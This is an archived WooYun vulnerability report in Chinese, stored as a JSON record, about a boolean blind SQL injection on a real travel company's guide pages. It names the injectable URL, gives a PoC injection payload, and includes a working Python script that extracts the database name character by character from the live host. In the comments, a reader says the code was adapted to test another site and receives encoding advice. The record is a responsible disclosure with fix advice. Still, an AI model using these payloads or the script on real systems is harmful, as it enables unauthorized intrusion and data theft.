{"id": 46731, "wybug_id": "wooyun-2015-089660", "wybug_title": "同程旅游网攻略频道页SQL盲注附加POC", "wybug_corp": "苏州同程旅游网络科技有限公司", "wybug_author": "Yns0ng", "wybug_date": "2015-01-02 09:38", "wybug_open_date": "2015-02-16 09:40", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["盲注"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-02：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-12：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-22：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-02-01：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-02-16：\t细节向公众公开  简要描述： Boolean盲注，附验证脚本，仅供验证漏洞用。 详细说明：     漏洞证明：  1，注入点http://go.ly.com/gonglve/jing-liuheyeshi-24645/ 24645为注入参数2，PoChttp://go.ly.com/gonglve/jing-liuheyeshi-24645'%20and%20len(db_name())=7%20and%20'1'='1/页面正常，表明当前操作db的长度为7个字符。当将7改成其它值时，页面301跳转。3，Exp知道了db长度，又知道了Boolean为false时，页面301。可以编写一简单脚本，猜出库名。同理，也可猜出其它系统信息，如：连接db的用户名等。\n\n4，验证脚本\n#encoding=utf-8import httplibimport timeimport sysimport urllib\"\"\"This is the block of docstring.\"\"\"charset = list('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.[]')headers = {    'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36',}print '[%s] Start to retrive database: ' % time.strftime('%H:%M:%S', time.localtime())db = ''for i in range(1, 8):    for char in charset:        con = httplib.HTTPConnection('go.ly.com', 80, timeout=20)        payload = \"' and ascii(substring(db_name(),%s,1))=%s and '1'='1\" % (i, ord(char))        con.request(method='GET', url='/gonglve/jing-liuheyeshi-24645' + payload + '/', headers=headers)\t            code = con.getresponse().status        con.close()                if code == 200:\t\t    db += char\t\t    sys.stdout.write('\\n[Retriving database] ' + db)\t\t    sys.stdout.flush()\t\t    break        else:            passprint '\\n[%s Done] Database is %s' % (time.strftime('%H:%M:%S', time.localtime()), db)\n   修复方案：  1，以参数绑定方式执行SQL；2，在入口处加上防护组件，检测外部参数；3，上防护设备。   版权声明：转载请注明来源 Yns0ng@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-01-02 13:39 厂商回复： 感谢关注同程旅游，这个和上一个其实是一个codebase，迁过来的。这个给不了礼品卡，给你补点rank吧。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-01-03 22:37 |    \t\t昭之 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:3        | 大神，求罩。)\t\t \n  这厂商好啊    \n     2015-03-09 12:07 |    \t\t明月影 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:8        | 学姿势，学思路。)\t\t \n  希望洞主把自己的脚本补充到sqlmap里边，它将会更加强大。然后……    \n     2015-05-08 08:36 |    \t\tharbour_bin \t\t\t( 普通白帽子  |\t\t\t        Rank:358 漏洞数:47        | 向TOP200进军！)\t\t \n  你好,学习你的代码后,我尝试自己写代码测试某一网站,发现我的那个必须写成payload = \"%27%20and%20%271%27=%271\"(初始为payload=\"' and '1'='1\");我感觉是编码问题,希望你能给我一些指导,谢谢    \n     2015-05-10 23:16 |    \t\tYns0ng \t\t\t( 普通白帽子  |\t\t\t        Rank:104 漏洞数:12        | 闭关修炼中)\t\t \n  @harbour_bin 是编码问题，需要对payload进行urlencode，可以使用urllib模块的quote方法进行encode。    \n     2015-05-15 18:13 |    \t\tharbour_bin \t\t\t( 普通白帽子  |\t\t\t        Rank:358 漏洞数:47        | 向TOP200进军！)\t\t \n  @Yns0ng 已解决,谢谢    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}